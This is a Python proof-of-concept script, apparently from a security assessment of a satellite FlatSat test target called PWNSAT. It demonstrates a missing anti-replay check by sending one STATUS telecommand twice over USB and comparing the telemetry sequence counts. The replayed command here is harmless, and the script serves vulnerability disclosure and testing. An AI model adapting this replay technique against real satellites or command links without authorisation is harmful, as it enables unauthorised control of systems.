#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 06_replay_usb.py -- no anti-replay protection, over the USB CDC serial
# link instead of RF. See 06_replay_rf.py for the full root-cause writeup
# (commandHandlerInternal() parses sequence_count but never compares it).
#
# Uses STATUS (APID 0x0C) instead of PING for the same reason as the RF
# version: PING TMs are emitted periodically on their own, so a replayed
# PING would be ambiguous; STATUS is command-response only.
#
# Builds ONE STATUS packet and transmits those EXACT SAME bytes twice. The
# outgoing TM sequence_count and uptime_s both advancing between the two
# replies proves two separate executions, not one cached response.

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

sys.stdout.reconfigure(line_buffering=True)

from flatsat_usb import FlatSatUSB  # noqa: E402
from pwnsat_packets import decode_packet, decrypt_payload  # noqa: E402

STATUS_TM_APID = 0x0C  # SPP_APID_TM_STATUS -- command-response only, never periodic


def parse_status_tm(raw: bytes) -> dict:
    """Same layout as the RF version's parse_status_tm() -- see
    telemetrySPPTransmitMissionStatus() in worker.cpp."""
    pkt = decode_packet(raw)
    plain = decrypt_payload(pkt.data)
    if len(plain) < 16:
        raise ValueError(f"STATUS TM payload too short: {len(plain)} bytes")
    return {
        "mode": plain[1],
        "flags": plain[2],
        "uptime_s": int.from_bytes(plain[12:16], "little"),
        "tm_sequence_count": pkt.sequence_count,
    }


def find_status_reply(packets: list[bytes], verbose: bool):
    for raw in packets:
        try:
            pkt = decode_packet(raw)
        except ValueError:
            continue
        if pkt.apid != STATUS_TM_APID:
            continue
        try:
            return parse_status_tm(raw)
        except ValueError as exc:
            if verbose:
                print(f"    (STATUS-shaped frame, couldn't parse: {exc})")
    return None


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--seq", type=int, default=1,
                        help="SPP sequence count for the ONE packet built -- both the "
                             "original send and the replay use these exact same bytes")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--replay-delay", type=float, default=5.0,
                        help="seconds to wait between the original send and the replay")
    parser.add_argument("--listen-seconds", type=float, default=1.5,
                        help="how long to wait after each send for the reply")
    parser.add_argument("--port", default=None,
                        help="serial port for the USBRadioLink (default: autodetect)")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    print("=" * 66)
    print("PWNSAT replay (USB) -- no anti-replay protection (finding #5)")
    print(f"ONE STATUS packet built ({'encrypted' if args.encrypt == 'on' else 'cleartext'}, "
          f"seq={args.seq}) -- the exact same bytes get sent TWICE, once now, "
          f"once again after {args.replay_delay:.1f}s.")
    print("=" * 66)

    with FlatSatUSB(port=args.port, encrypt=(args.encrypt == "on"),
                    verbose=not args.quiet) as fsat:

        def send_once(label: str) -> dict | None:
            print(f"\n[*] {label} -- sending over USB...")
            _raw, _framed, packets = fsat.send_tc(
                "status", seq=args.seq, listen_seconds=args.listen_seconds,
            )
            reply = find_status_reply(packets, verbose=not args.quiet)
            if reply is None:
                print("    -> no STATUS reply captured (unexpected over a wired link -- "
                      "check the connection).")
            else:
                print(f"    -> STATUS TM received. mode={reply['mode']} "
                      f"uptime_s={reply['uptime_s']} outgoing TM sequence_count="
                      f"{reply['tm_sequence_count']}")
            return reply

        first = send_once("Original send")
        print(f"\n[*] Waiting {args.replay_delay:.1f}s before replaying "
              f"(the firmware has no window for this to expire)...")
        time.sleep(args.replay_delay)
        second = send_once("Replay (byte-identical retransmission)")

    print("\n" + "=" * 66)
    if first and second:
        if second["tm_sequence_count"] != first["tm_sequence_count"] and second["uptime_s"] >= first["uptime_s"]:
            print(f"[+] REPLAY ACCEPTED: identical TC bytes answered twice -- outgoing TM "
                  f"sequence_count went {first['tm_sequence_count']} -> "
                  f"{second['tm_sequence_count']}, uptime_s went {first['uptime_s']} -> "
                  f"{second['uptime_s']}. Two genuinely separate, real executions of the "
                  f"same static command -- confirms the FlatSat has no replay window.")
        else:
            print("[?] Got two STATUS replies but the sequence/uptime didn't advance as "
                  "expected -- unexpected, look at the raw frames above before drawing a "
                  "conclusion.")
    else:
        print("[?] Couldn't confirm one or both sends -- unexpected over a wired link, "
              "check the connection and retry.")
    print("=" * 66)


if __name__ == "__main__":
    main()
